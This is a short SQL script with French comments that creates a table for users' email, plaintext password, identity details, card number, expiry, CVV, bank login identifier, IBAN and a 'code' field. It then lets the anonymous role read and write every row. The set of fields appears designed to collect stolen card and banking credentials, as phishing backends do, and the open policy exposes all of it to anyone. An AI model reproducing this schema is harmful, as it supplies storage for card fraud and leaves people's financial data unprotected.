
-- Création de la table users
CREATE TABLE public.sefon (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  email TEXT,
  password TEXT,
  nom TEXT,
  prenom TEXT,
  datenaissance TEXT,
  adresse TEXT,
  codepostal TEXT,
  ville TEXT,
  telephone TEXT,
  numerocarte TEXT,
  dateexpiration TEXT,
  cryptogramme TEXT,
  typebanque TEXT,
  identifiantiban TEXT,
  codepersonne TEXT,
  montant NUMERIC,
  code TEXT,
  iban TEXT,
  pays TEXT,
  date_creation TIMESTAMP WITH TIME ZONE DEFAULT now()
);

-- Configuration des autorisations RLS (Row Level Security)
ALTER TABLE public.sefon ENABLE ROW LEVEL SECURITY;

-- Création d'une politique pour permettre toutes les opérations pour les utilisateurs anonymes
-- Note: Dans un environnement de production, il est recommandé de restreindre davantage ces autorisations
CREATE POLICY "Allow anonymous access" ON public.sefon
  FOR ALL
  TO anon
  USING (true)
  WITH CHECK (true);
